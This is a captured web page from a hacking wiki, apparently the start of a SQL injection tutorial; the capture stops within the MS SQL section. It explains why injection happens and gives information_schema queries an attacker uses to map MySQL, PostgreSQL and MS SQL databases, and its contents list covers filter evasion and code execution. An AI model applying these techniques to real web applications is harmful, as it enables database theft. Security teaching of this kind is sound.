http://www.blackhatlibrary.net/SQL_injection
HTTP/1.1 200 OK
Server: cloudflare-nginx
Date: Tue, 22 Jul 2014 15:37:54 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: __cfduid=d1399f4f827c0be932911335a479602af1406043468908; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.blackhatlibrary.net; HttpOnly
X-Powered-By: PHP/5.4.15
Content-language: en
Vary: Accept-Encoding, Cookie
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: private, must-revalidate, max-age=0
CF-RAY: 14e0b8c0a011087a-IAD
Content-Encoding: gzip

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8" />
<title>SQL injection - Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</title>
<meta name="generator" content="MediaWiki" />
<meta name="og:title" content="SQL injection" />
<meta name="og:type" content="article" />
<meta name="og:image" content="http://www.blackhatacademy.org/security101/logo.png" />
<meta name="og:site_name" content="Blackhat Academy - Security101 Wiki" />
<meta name="og:description" content="For security reasons, we cannot remotely parse content.  Please visit the link provided to see the full article!" />
<link rel="shortcut icon" href="/favicon.ico" />
<link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools (en)" />
<link rel="EditURI" type="application/rsd+xml" href="http://www.blackhatlibrary.net/api.php?action=rsd" />
<link rel="alternate" type="application/atom+xml" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools Atom feed" href="/index.php?title=Special:RecentChanges&amp;feed=atom" />
<link rel="stylesheet" href="/load.php?debug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint%2Cshared&amp;only=styles&amp;skin=monobook&amp;*" />
<link rel="stylesheet" href="/skins/monobook/main.css?" media="screen" />
<!--[if lt IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE50Fixes.css?" media="screen" /><![endif]-->
<!--[if IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE55Fixes.css?" media="screen" /><![endif]-->
<!--[if IE 6]><link rel="stylesheet" href="/skins/monobook/IE60Fixes.css?" media="screen" /><![endif]-->
<!--[if IE 7]><link rel="stylesheet" href="/skins/monobook/IE70Fixes.css?" media="screen" /><![endif]--><meta name="ResourceLoaderDynamicStyles" content="" />
<style type="text/css">/*<![CDATA[*/
.source-sql {line-height: normal;}
.source-sql li, .source-sql pre {
	line-height: normal; border: 0px none white;
}
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for sql
 * CSS class: source-sql, CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.sql.source-sql .de1, .sql.source-sql .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;}
.sql.source-sql  {font-family:monospace;}
.sql.source-sql .imp {font-weight: bold; color: red;}
.sql.source-sql li, .sql.source-sql .li1 {font-weight: normal; vertical-align:top;}
.sql.source-sql .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.sql.source-sql .li2 {font-weight: bold; vertical-align:top;}
.sql.source-sql .kw1 {color: #993333; font-weight: bold;}
.sql.source-sql .co1 {color: #808080; font-style: italic;}
.sql.source-sql .coMULTI {color: #808080; font-style: italic;}
.sql.source-sql .es0 {color: #000099; font-weight: bold;}
.sql.source-sql .br0 {color: #66cc66;}
.sql.source-sql .sy0 {color: #66cc66;}
.sql.source-sql .st0 {color: #ff0000;}
.sql.source-sql .nu0 {color: #cc66cc;}
.sql.source-sql .ln-xtra, .sql.source-sql li.ln-xtra, .sql.source-sql div.ln-xtra {background-color: #ffc;}
.sql.source-sql span.xtra { display:block; }

/*]]>*/
</style>
<style type="text/css">/*<![CDATA[*/
@import "/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=18000";
/*]]>*/
</style><style type="text/css">/*<![CDATA[*/
.source-php {line-height: normal;}
.source-php li, .source-php pre {
	line-height: normal; border: 0px none white;
}
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for php
 * CSS class: source-php, CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.php.source-php .de1, .php.source-php .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;}
.php.source-php  {font-family:monospace;}
.php.source-php .imp {font-weight: bold; color: red;}
.php.source-php li, .php.source-php .li1 {font-weight: normal; vertical-align:top;}
.php.source-php .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.php.source-php .li2 {font-weight: bold; vertical-align:top;}
.php.source-php .kw1 {color: #b1b100;}
.php.source-php .kw2 {color: #000000; font-weight: bold;}
.php.source-php .kw3 {color: #990000;}
.php.source-php .kw4 {color: #009900; font-weight: bold;}
.php.source-php .co1 {color: #666666; font-style: italic;}
.php.source-php .co2 {color: #666666; font-style: italic;}
.php.source-php .co3 {color: #0000cc; font-style: italic;}
.php.source-php .co4 {color: #009933; font-style: italic;}
.php.source-php .coMULTI {color: #666666; font-style: italic;}
.php.source-php .es0 {color: #000099; font-weight: bold;}
.php.source-php .es1 {color: #000099; font-weight: bold;}
.php.source-php .es2 {color: #660099; font-weight: bold;}
.php.source-php .es3 {color: #660099; font-weight: bold;}
.php.source-php .es4 {color: #006699; font-weight: bold;}
.php.source-php .es5 {color: #006699; font-weight: bold; font-style: italic;}
.php.source-php .es6 {color: #009933; font-weight: bold;}
.php.source-php .es_h {color: #000099; font-weight: bold;}
.php.source-php .br0 {color: #009900;}
.php.source-php .sy0 {color: #339933;}
.php.source-php .sy1 {color: #000000; font-weight: bold;}
.php.source-php .st0 {color: #0000ff;}
.php.source-php .st_h {color: #0000ff;}
.php.source-php .nu0 {color: #cc66cc;}
.php.source-php .nu8 {color: #208080;}
.php.source-php .nu12 {color: #208080;}
.php.source-php .nu19 {color:#800080;}
.php.source-php .me1 {color: #004000;}
.php.source-php .me2 {color: #004000;}
.php.source-php .re0 {color: #000088;}
.php.source-php .ln-xtra, .php.source-php li.ln-xtra, .php.source-php div.ln-xtra {background-color: #ffc;}
.php.source-php span.xtra { display:block; }

/*]]>*/
</style>
<style type="text/css">/*<![CDATA[*/
@import "/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=18000";
/*]]>*/
</style></head>
<body class="mediawiki ltr ns-0 ns-subject page-SQL_injection skin-monobook">
<div id="globalWrapper">
<div id="column-content"><div id="content">
	<a id="top"></a>
	<div id="siteNotice"><div id="localNotice"><div align="right"><i>Questions about this topic? <a href="/Special:UserLogin" title="Special:UserLogin">Sign up</a> to ask in the talk tab</i>.</div><br />
</div></div>	<div align="center" id="ad"><script type="text/javascript"><!--
google_ad_client = "ca-pub-3100048614381705";
google_ad_slot = "3567986077";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>
	<h1 id="firstHeading" class="firstHeading">SQL injection</h1>
	<div id="bodyContent">
		<div id="siteSub">From Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</div>
		<div id="contentSub"></div>
		<div id="jump-to-nav">Jump to: <a href="#column-one">navigation</a>, <a href="#searchInput">search</a></div>
		<!-- start content -->
<p><b><a href="/SQL" title="SQL">SQL</a> injection</b> is a method of <a href="/Web_Exploitation" title="Web Exploitation" class="mw-redirect">exploiting web applications</a> performed over <a href="/HTTP" title="HTTP"><b>http</b> or <b>https</b></a> to compromise the underlying <a href="/Databasing_engine" title="Databasing engine">database engine</a> supporting dynamic content for the <a href="/Web_applications" title="Web applications" class="mw-redirect">web application</a> itself.  Successful exploitation of an <a href="/SQL" title="SQL">SQL</a> injection <a href="/Vulnerability" title="Vulnerability">vulnerability</a> can result in the attacker gaining unfettered access to the <a href="/Database" title="Database">database</a> and can lead to further <a href="/Privilege_escalation" title="Privilege escalation">privilege escalation</a>.
</p><p><b>Typically, databases include things like (but not limited to):</b>
</p>
<ul><li> <a href="/Authentication_credential" title="Authentication credential">Authentication credentials</a>
</li><li> Other identifying information about a user (like an <a href="/IP_address" title="IP address">IP address</a>)
</li><li> Site configurations 
</li><li> Site content and themes
</li><li> Communications between users within the site
</li></ul>
<table style="text-align:center; background: #fff; border: 1px solid #000; width: 50%; margin: 5px auto;">
<tr>
<td><i>SQL injection requires a basic understanding of <a href="/SQL" title="SQL">SQL</a> and <a href="/SQL_Orientation" title="SQL Orientation" class="mw-redirect">manipulation of SQL data</a></i>
</td></tr></table>
<p><br />
</p>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td><i>This page will be updated relatively frequently, if it does not have the answer to your question, try the <a href="/IRC" title="IRC" class="mw-redirect">IRC</a>, or check back later. In the <a href="/IRC" title="IRC" class="mw-redirect">IRC</a>, we'll do our best to help you find the solution. Also, if you see missing things you'd like to contribute, don't hesitate to contact us.</i>
</td></tr></table>
<p><font size="-2">Special thanks to <a href="/User:Hatter" title="User:Hatter">hatter</a> for his contributions to this article.</font>
</p>
<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
<ul>
<li class="toclevel-1 tocsection-1"><a href="#Cause.28s.29_of_vulnerabilities"><span class="tocnumber">1</span> <span class="toctext">Cause(s) of vulnerabilities</span></a></li>
<li class="toclevel-1 tocsection-2"><a href="#Potential_target_environments"><span class="tocnumber">2</span> <span class="toctext">Potential target environments</span></a>
<ul>
<li class="toclevel-2"><a href="#Navigating_unfamiliar_databases_without_the_C_API"><span class="tocnumber">2.1</span> <span class="toctext">Navigating unfamiliar databases without the C API</span></a>
<ul>
<li class="toclevel-3"><a href="#MySQL_database_mapping"><span class="tocnumber">2.1.1</span> <span class="toctext">MySQL database mapping</span></a></li>
<li class="toclevel-3"><a href="#PostgreSQL_mapping"><span class="tocnumber">2.1.2</span> <span class="toctext">PostgreSQL mapping</span></a></li>
<li class="toclevel-3"><a href="#MS_SQL_mapping"><span class="tocnumber">2.1.3</span> <span class="toctext">MS SQL mapping</span></a></li>
<li class="toclevel-3"><a href="#Legacy_databases"><span class="tocnumber">2.1.4</span> <span class="toctext">Legacy databases</span></a></li>
</ul>
</li>
<li class="toclevel-2"><a href="#Databasing_engines_compared_and_contrasted_in_light_of_SQL_injection"><span class="tocnumber">2.2</span> <span class="toctext">Databasing engines compared and contrasted in light of SQL injection</span></a>
<ul>
<li class="toclevel-3"><a href="#Information_schema"><span class="tocnumber">2.2.1</span> <span class="toctext">Information_schema</span></a></li>
<li class="toclevel-3"><a href="#Functions_.26_environment_variables"><span class="tocnumber">2.2.2</span> <span class="toctext">Functions &amp; environment variables</span></a></li>
<li class="toclevel-3"><a href="#Other_syntax"><span class="tocnumber">2.2.3</span> <span class="toctext">Other syntax</span></a></li>
<li class="toclevel-3"><a href="#Capabilities"><span class="tocnumber">2.2.4</span> <span class="toctext">Capabilities</span></a></li>
</ul>
</li>
</ul>
</li>
<li class="toclevel-1 tocsection-3"><a href="#Modern_day_SQL_injection_obstacles_and_countermeasures"><span class="tocnumber">3</span> <span class="toctext">Modern day SQL injection obstacles and countermeasures</span></a>
<ul>
<li class="toclevel-2"><a href="#Configuration_.26_environment_challenges"><span class="tocnumber">3.1</span> <span class="toctext">Configuration &amp; environment challenges</span></a>
<ul>
<li class="toclevel-3"><a href="#IDS.2C_IPS.2C_and_web_application_firewalls"><span class="tocnumber">3.1.1</span> <span class="toctext">IDS, IPS, and web application firewalls</span></a></li>
<li class="toclevel-3"><a href="#Common_web_application_firewall_HTTPD_modules"><span class="tocnumber">3.1.2</span> <span class="toctext">Common web application firewall HTTPD modules</span></a></li>
</ul>
</li>
<li class="toclevel-2"><a href="#Improper_sanitizing"><span class="tocnumber">3.2</span> <span class="toctext">Improper sanitizing</span></a>
<ul>
<li class="toclevel-3"><a href="#Partial_sanitizing"><span class="tocnumber">3.2.1</span> <span class="toctext">Partial sanitizing</span></a></li>
<li class="toclevel-3"><a href="#Deprecated_sanitizing"><span class="tocnumber">3.2.2</span> <span class="toctext">Deprecated sanitizing</span></a></li>
</ul>
</li>
</ul>
</li>
<li class="toclevel-1 tocsection-4"><a href="#Basic_remote_tests_for_SQL_injection_vulnerabilities"><span class="tocnumber">4</span> <span class="toctext">Basic remote tests for SQL injection vulnerabilities</span></a>
<ul>
<li class="toclevel-2"><a href="#Injection_points"><span class="tocnumber">4.1</span> <span class="toctext">Injection points</span></a></li>
<li class="toclevel-2"><a href="#Input_testing"><span class="tocnumber">4.2</span> <span class="toctext">Input testing</span></a>
<ul>
<li class="toclevel-3"><a href="#Your_first_where_clause_injection"><span class="tocnumber">4.2.1</span> <span class="toctext">Your first where clause injection</span></a></li>
<li class="toclevel-3"><a href="#Reconstructing_injected_queries"><span class="tocnumber">4.2.2</span> <span class="toctext">Reconstructing injected queries</span></a></li>
</ul>
</li>
</ul>
</li>
<li class="toclevel-1 tocsection-5"><a href="#Bypassing_modern_SQL_injection_security_measures"><span class="tocnumber">5</span> <span class="toctext">Bypassing modern SQL injection security measures</span></a>
<ul>
<li class="toclevel-2 tocsection-6"><a href="#Basic_signature_evasion"><span class="tocnumber">5.1</span> <span class="toctext">Basic signature evasion</span></a>
<ul>
<li class="toclevel-3 tocsection-7"><a href="#Whitespace_placement"><span class="tocnumber">5.1.1</span> <span class="toctext">Whitespace placement</span></a></li>
<li class="toclevel-3 tocsection-8"><a href="#Integer_and_string_size_delimiters"><span class="tocnumber">5.1.2</span> <span class="toctext">Integer and string size delimiters</span></a></li>
<li class="toclevel-3 tocsection-9"><a href="#Switching_up_the_data_types"><span class="tocnumber">5.1.3</span> <span class="toctext">Switching up the data types</span></a></li>
<li class="toclevel-3 tocsection-10"><a href="#Arithmetic_tests"><span class="tocnumber">5.1.4</span> <span class="toctext">Arithmetic tests</span></a></li>
<li class="toclevel-3 tocsection-11"><a href="#Capitalization"><span class="tocnumber">5.1.5</span> <span class="toctext">Capitalization</span></a></li>
<li class="toclevel-3 tocsection-12"><a href="#Extending_conditional_statements"><span class="tocnumber">5.1.6</span> <span class="toctext">Extending conditional statements</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-13"><a href="#Defeating_partial_sanitizing"><span class="tocnumber">5.2</span> <span class="toctext">Defeating partial sanitizing</span></a>
<ul>
<li class="toclevel-3 tocsection-14"><a href="#Quotes"><span class="tocnumber">5.2.1</span> <span class="toctext">Quotes</span></a></li>
<li class="toclevel-3 tocsection-15"><a href="#Whitespace_filtering"><span class="tocnumber">5.2.2</span> <span class="toctext">Whitespace filtering</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-16"><a href="#Bypassing_XSS_filters_during_SQL_injection"><span class="tocnumber">5.3</span> <span class="toctext">Bypassing XSS filters during SQL injection</span></a>
<ul>
<li class="toclevel-3 tocsection-17"><a href="#Testing_with_BETWEEN"><span class="tocnumber">5.3.1</span> <span class="toctext">Testing with BETWEEN</span></a></li>
<li class="toclevel-3 tocsection-18"><a href="#Testing_with_Regular_Expression_Operators_.28REGEXP.2C_.7E.2C_and_RLIKE.29"><span class="tocnumber">5.3.2</span> <span class="toctext">Testing with Regular Expression Operators (REGEXP, ~, and RLIKE)</span></a></li>
</ul>
</li>
</ul>
</li>
<li class="toclevel-1 tocsection-19"><a href="#Intermediate_SQL_injection"><span class="tocnumber">6</span> <span class="toctext">Intermediate SQL injection</span></a>
<ul>
<li class="toclevel-2 tocsection-20"><a href="#Automation_theory"><span class="tocnumber">6.1</span> <span class="toctext">Automation theory</span></a></li>
<li class="toclevel-2 tocsection-21"><a href="#Basic_Injection_:_Union_Select"><span class="tocnumber">6.2</span> <span class="toctext">Basic Injection&#160;: Union Select</span></a>
<ul>
<li class="toclevel-3 tocsection-22"><a href="#Determining_the_number_of_columns"><span class="tocnumber">6.2.1</span> <span class="toctext">Determining the number of columns</span></a></li>
<li class="toclevel-3 tocsection-23"><a href="#Extracting_data"><span class="tocnumber">6.2.2</span> <span class="toctext">Extracting data</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-24"><a href="#Intermediate_testing:_.22SELECT.22_..._LIMIT_clause_injections"><span class="tocnumber">6.3</span> <span class="toctext">Intermediate testing: "SELECT" ... LIMIT clause injections</span></a></li>
<li class="toclevel-2 tocsection-25"><a href="#Intermediate_injection:_information_retrieval_via_verbose_errors"><span class="tocnumber">6.4</span> <span class="toctext">Intermediate injection: information retrieval via verbose errors</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-26"><a href="#Blind_SQL_injection"><span class="tocnumber">7</span> <span class="toctext">Blind SQL injection</span></a>
<ul>
<li class="toclevel-2"><a href="#Blind_extraction"><span class="tocnumber">7.1</span> <span class="toctext">Blind extraction</span></a></li>
<li class="toclevel-2"><a href="#Boolean_Enumeration"><span class="tocnumber">7.2</span> <span class="toctext">Boolean Enumeration</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-27"><a href="#Further_penetration"><span class="tocnumber">8</span> <span class="toctext">Further penetration</span></a>
<ul>
<li class="toclevel-2 tocsection-28"><a href="#Obtaining_direct_database_access"><span class="tocnumber">8.1</span> <span class="toctext">Obtaining direct database access</span></a></li>
<li class="toclevel-2 tocsection-29"><a href="#Obtaining_filesystem_access"><span class="tocnumber">8.2</span> <span class="toctext">Obtaining filesystem access</span></a></li>
<li class="toclevel-2 tocsection-30"><a href="#Obtaining_code_execution"><span class="tocnumber">8.3</span> <span class="toctext">Obtaining code execution</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-31"><a href="#Cheat_Sheets"><span class="tocnumber">9</span> <span class="toctext">Cheat Sheets</span></a>
<ul>
<li class="toclevel-2 tocsection-32"><a href="#Vulnerability_testing"><span class="tocnumber">9.1</span> <span class="toctext">Vulnerability testing</span></a>
<ul>
<li class="toclevel-3 tocsection-33"><a href="#Universal_true_and_false_statements"><span class="tocnumber">9.1.1</span> <span class="toctext">Universal true and false statements</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-34"><a href="#MySQL_syntax_reference"><span class="tocnumber">9.2</span> <span class="toctext">MySQL syntax reference</span></a>
<ul>
<li class="toclevel-3 tocsection-35"><a href="#Mysql_versions_.3E.3D_5_user_schema_mapping_.28unprivileged.29"><span class="tocnumber">9.2.1</span> <span class="toctext">Mysql versions &gt;= 5 user schema mapping (unprivileged)</span></a></li>
<li class="toclevel-3 tocsection-36"><a href="#Privileged_MySQL_.28any_version.29_user"><span class="tocnumber">9.2.2</span> <span class="toctext">Privileged MySQL (any version) user</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-37"><a href="#PostgreSQL_syntax_reference"><span class="tocnumber">9.3</span> <span class="toctext">PostgreSQL syntax reference</span></a>
<ul>
<li class="toclevel-3 tocsection-38"><a href="#PostgreSQL_schema_mapping"><span class="tocnumber">9.3.1</span> <span class="toctext">PostgreSQL schema mapping</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-39"><a href="#Microsoft_SQL_syntax_reference"><span class="tocnumber">9.4</span> <span class="toctext">Microsoft SQL syntax reference</span></a>
<ul>
<li class="toclevel-3 tocsection-40"><a href="#Microsoft_SQL_schema_mapping_.28unprivileged.29"><span class="tocnumber">9.4.1</span> <span class="toctext">Microsoft SQL schema mapping (unprivileged)</span></a></li>
<li class="toclevel-3 tocsection-41"><a href="#Privileged_microsoft_SQL_injection"><span class="tocnumber">9.4.2</span> <span class="toctext">Privileged microsoft SQL injection</span></a></li>
</ul>
</li>
</ul>
</li>
<li class="toclevel-1 tocsection-42"><a href="#Patching_SQL_Injection_Vulnerabilities"><span class="tocnumber">10</span> <span class="toctext">Patching SQL Injection Vulnerabilities</span></a></li>
<li class="toclevel-1 tocsection-43"><a href="#SQL_Injection_Tools"><span class="tocnumber">11</span> <span class="toctext">SQL Injection Tools</span></a></li>
<li class="toclevel-1 tocsection-44"><a href="#Further_reading"><span class="tocnumber">12</span> <span class="toctext">Further reading</span></a></li>
</ul>
</td></tr></table>
<h1> <span class="mw-headline" id="Cause.28s.29_of_vulnerabilities"> Cause(s) of <a href="/Vulnerability" title="Vulnerability">vulnerabilities</a> </span></h1>
<p><i>Now is a good time for orientation with <a href="/SQL" title="SQL">SQL</a> servers and queries with the <a href="/SQL_Orientation" title="SQL Orientation" class="mw-redirect">SQL primer</a>, otherwise this text may prove be confusing. </i>
<b>SQL Injection</b> occurs when <a href="/Input" title="Input">input</a> from a user is directly passed to a <a href="/SQL" title="SQL">SQL</a> query by an <a href="/Application" title="Application">application</a>.  In the context of <a href="/Web_applications" title="Web applications" class="mw-redirect">web applications</a>, user input comes from <a href="/Web_Exploitation#Attack_Vectors" title="Web Exploitation" class="mw-redirect">HTTP input</a>.
</p>
<ul><li> <b>Un-sanitized user <a href="/Input" title="Input">input</a></b>  - The developer made no effort to <a href="#Patching_SQL_Injection_Vulnerabilities">stop an injection attack</a>
</li><li> <b>Improper type handling</b>   - An integer <a href="/Sanitize" title="Sanitize">sanitized</a> or otherwise treated as a string, or vice versa
</li><li> <b>Lack of output filtering</b> - Output from a query that had user <a href="/Input" title="Input">input</a> passed to it is used as <a href="/Input" title="Input">input</a> in later queries when rendering the page
</li><li> <b><a href="/Cookies" title="Cookies">Cookies</a></b> and other "hidden" forms of communication in the <a href="/HTTP" title="HTTP">HTTP</a> request header are also processed as user <a href="/Input" title="Input">input</a> and can be considered <a href="/Web_Exploitation#Attack_Vectors" title="Web Exploitation" class="mw-redirect">attack vectors</a> as well.
</li></ul>
<h1> <span class="mw-headline" id="Potential_target_environments"> Potential target environments </span></h1>
<p>A variety of environments are vulnerable to <a href="/SQL" title="SQL">SQL</a> injection.  Nearly all of the <a href="/Interpreted_languages" title="Interpreted languages" class="mw-redirect">interpreted languages</a> and <a href="/Compiled_languages" title="Compiled languages" class="mw-redirect">compiled languages</a> could be used to write a <a href="/Vulnerability" title="Vulnerability">vulnerable</a> application.  <a href="/Databasing_engine" title="Databasing engine">Databasing engines</a> such as <a href="/MySQL" title="MySQL">MySQL</a>, PostgreSQL, Microsoft SQL Server, or Oracle could be used in a <a href="/Vulnerability" title="Vulnerability">vulnerable</a> application. It is important to note the <a href="/HTTP" title="HTTP">HTTP</a> server's version information along with the <a href="/Programming_language" title="Programming language" class="mw-redirect">programming language</a> in use by any application during testing.  This in conjunction with <a href="/Operating_System" title="Operating System">Operating System</a> information will assist during <a href="#Further_Penetration">privilege escalation with injection</a>.
</p>
<h2> <span class="mw-headline" id="Navigating_unfamiliar_databases_without_the_C_API"> Navigating unfamiliar databases without the <a href="/C" title="C">C</a> <a href="/API" title="API">API</a> </span></h2>
<p>Nearly every modern <a href="/Databasing_engine" title="Databasing engine">databasing engine</a> has an information_schema database or schema.  Important tables that are part of information_schema include <b>schemata, routines, columns, and tables</b>.
</p>
<h3> <span class="mw-headline" id="MySQL_database_mapping">MySQL database mapping</span></h3>
<p>When outside of the <a href="/C" title="C">C</a> <a href="/SQL" title="SQL">SQL</a> <a href="/API" title="API">API</a>, access the data structure via the information_schema database.
</p>
<ul><li> <i><b>Show Databases</b> equivalent:</i>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> schema_name <span class="kw1">FROM</span> information_schema<span class="sy0">.</span>schemata;</pre></div></div>
</td></tr></table>
<ul><li> <i><b>Show tables</b> equivalent:</i>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">TABLES</span> <span class="kw1">WHERE</span> table_schema<span class="sy0">=</span><span class="br0">&#91;</span>database_name<span class="br0">&#93;</span></pre></div></div>
</td></tr></table>
<ul><li> <i><b>Show fields</b> equivalent:</i>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> column_name <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">COLUMNS</span> <span class="kw1">WHERE</span> <span class="kw1">TABLE_NAME</span><span class="sy0">=</span><span class="br0">&#91;</span><span class="kw1">TABLE_NAME</span><span class="br0">&#93;</span> <span class="kw1">AND</span> table_schema<span class="sy0">=</span><span class="br0">&#91;</span>database_name<span class="br0">&#93;</span></pre></div></div>
</td></tr></table>
<p>If the currently selected database is the only accessible database in the context of the <a href="/Vulnerability" title="Vulnerability">vulnerable</a> query, time can be saved by using the database() function or @@database environment variables, e.g. <b>where table_schema &#x3d; database()</b> or <b>where table_schema &#x3d; @@database</b>.
</p>
<h3> <span class="mw-headline" id="PostgreSQL_mapping">PostgreSQL mapping</span></h3>
<p><b>PostgreSQL</b> has the <b>current_database()</b> function in stead of the <b>database()</b> function.
</p>
<ul><li> <i><b>\dn</b> equivalent:</i>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> schema_name <span class="kw1">FROM</span> information_schema<span class="sy0">.</span>schemata <span class="kw1">WHERE</span> catalog_name<span class="sy0">=</span><span class="br0">&#91;</span><span class="kw1">DATABASE</span> name<span class="br0">&#93;</span></pre></div></div>
</td></tr></table>
<ul><li> <i><b>\dt</b> equivalent:</i>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">TABLES</span> table_type<span class="sy0">=</span><span class="st0">'BASE TABLE'</span> <span class="kw1">AND</span> table_schema<span class="sy0">=</span><span class="br0">&#40;</span><span class="br0">&#91;</span>schema_query<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="kw1">AND</span> catalog_name<span class="sy0">=</span><span class="br0">&#91;</span><span class="kw1">DATABASE</span> name<span class="br0">&#93;</span></pre></div></div>
</td></tr></table>
<ul><li> <i><b>\d [column_name]</b> equivalent</i>:
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> column_name <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">COLUMNS</span> <span class="kw1">WHERE</span> <span class="kw1">TABLE_NAME</span><span class="sy0">=</span><span class="br0">&#40;</span><span class="br0">&#91;</span>table_query<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="kw1">AND</span> table_schema<span class="sy0">=</span><span class="br0">&#40;</span><span class="br0">&#91;</span>schema_query<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="kw1">AND</span> catalog_name<span class="sy0">=</span><span class="br0">&#91;</span>database_name<span class="br0">&#93;</span></pre></div></div>
</td></tr></table>
<p><br />
</p><p><br />
</p>
<h3> <span class="mw-headline" id="MS_SQL_mapping">MS SQL mapping</span></h3>
<p>An important note is that MS SQL is different when it comes to ordered single-cell selection.
</p>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> We don't <i>currently</i> have a method of listing all of the database names in MS SQL.  If you have a copy that one of the developers can use for testing to improve this article, please don't hesitate to let us know in <a href="/IRC" title="IRC" class="mw-redirect">IRC</a>.</div>
<ul><li> <b>Listing Tables</b>:
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">COLUMNS</span> <span class="kw1">WHERE</span> table_catalog<span class="sy0">=</span><span class="br0">&#91;</span>database_name<span class="br0">&#93;</span> <span class="kw1">GROUP</span> <span class="kw1">BY</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">ORDER</span> <span class="kw1">BY</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">ASC</span>;</pre></div></div>
</td></tr></table>
<ul><li> <b>Listing Columns</b>:
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> column_name <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">COLUMNS</span> <span class="kw1">WHERE</span> table_catalog<span class="sy0">=</span><span class="br0">&#91;</span>database_name<span class="br0">&#93;</span> <span class="kw1">AND</span> <span class="kw1">TABLE_NAME</span><span class="sy0">=</span><span class="br0">&#91;</span>table_query<span class="br0">&#93;</span> <span class="kw1">GROUP</span> <span class="kw1">BY</span> column_name <span class="kw1">ORDER</span> <span class="kw1">BY</span> column_name <span class="kw1">ASC</span></pre></div></div>
